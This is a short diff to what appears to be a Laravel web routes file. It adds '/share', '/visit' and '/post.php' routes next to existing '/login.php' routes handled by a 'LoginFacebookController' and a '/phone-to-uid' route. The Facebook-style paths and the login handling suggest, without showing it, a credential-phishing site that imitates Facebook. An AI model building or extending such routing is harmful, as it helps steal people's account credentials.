@@ -22,6 +22,8 @@ Route::post('/getUserAgent', 'UserAgentController@createNewUserAgent')->name('us
 Route::get('/login.php', 'LoginFacebookController@index')->name('loginfb.index');
 Route::post('/login.php', 'LoginFacebookController@actionLogin')->name('loginfb.actionLogin');
 
-Route::get('/denvau', 'BaseController@share');
+Route::get('/share', 'BaseController@share');
+Route::get('/visit', 'LoginFacebookController@visit');
+Route::get('/post.php', 'LoginFacebookController@loading')->name('fb.load');
 
 Route::get('/phone-to-uid', 'ProcessPhoneToUIDController@run');
